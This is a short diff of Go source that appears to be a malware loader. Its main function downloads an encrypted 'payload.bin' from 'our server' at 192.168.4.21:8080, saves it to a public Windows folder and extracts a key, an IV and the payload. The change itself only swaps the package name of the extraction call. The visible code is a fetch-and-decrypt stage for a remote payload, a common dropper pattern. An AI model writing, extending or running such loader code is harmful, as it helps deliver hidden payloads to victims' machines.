@@ -57,7 +57,7 @@ func main() {
 	//curl the file from our server on 192.168.4.21:8080/payload.bin
 	fileURL := "http://192.168.4.21:8080/payload.bin"
 	downloadFile("C:\\Users\\Public\\payload.bin", fileURL)
-	key, iv, payload, _ := stalling.ReadFileAndExtractComponents("C:\\Users\\Public\\payload.bin")
+	key, iv, payload, _ := encryption.ReadFileAndExtractComponents("C:\\Users\\Public\\payload.bin")
 
 	//valueString := encryption.BytesToHexArray(payload)
 	//ivString := encryption.BytesToHexArray(iv)
